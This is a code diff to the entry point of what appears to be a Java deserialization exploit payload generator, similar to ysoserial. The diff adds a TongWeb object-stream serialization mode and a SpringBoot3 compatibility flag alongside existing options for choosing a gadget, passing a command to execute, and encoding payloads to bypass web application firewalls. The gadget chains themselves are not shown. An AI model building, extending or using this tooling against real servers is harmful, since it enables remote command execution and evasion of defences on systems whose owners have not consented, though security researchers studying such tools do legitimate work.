@@ -133,6 +133,14 @@ public class Starter {
                 }
             }
 
+            if (cmdLine.hasOption("tongweb-object-input-stream")) {
+                Config.TONGWEB = true;
+            }
+
+            if (cmdLine.hasOption("springboot3")) {
+                Config.SPRINGBOOT3 = true;
+            }
+
             final String payloadType  = cmdLine.getOptionValue("gadget");
             final String command      = cmdLine.getOptionValue("parameters");
             final String payloadType1 = payloadType.toLowerCase();
@@ -144,7 +152,6 @@ public class Starter {
                 System.exit(1);
                 return;
             }
-
 
             try {
                 ObjectPayload payload = payloadClass.newInstance();
@@ -175,8 +182,13 @@ public class Starter {
                     Serializer.qiserialize4l(object, out);
                     ObjectPayload.Utils.releasePayload(payload, object);
                 } else {
-                    Serializer.qiserialize(object, out);
-                    ObjectPayload.Utils.releasePayload(payload, object);
+                    if (Config.TONGWEB){
+                        Serializer.tongwebSerialize(object, out);
+                        ObjectPayload.Utils.releasePayload(payload, object);
+                    }else {
+                        Serializer.qiserialize(object, out);
+                        ObjectPayload.Utils.releasePayload(payload, object);
+                    }
                 }
                 out.flush();
                 out.close();
@@ -214,6 +226,8 @@ public class Starter {
         options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
         options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");
         options.addOption("utf", "utf8-Overlong-Encoding", false, "UTF-8 Overlong Encoding Bypass waf");
+        options.addOption("tongweb", "tongweb-object-input-stream", false, "Use TongWebObjectInputStream for serialization");
+        options.addOption("springboot3", "springboot3", false, "Make payload compatible with SpringBoot3");
         return options;
     }
 
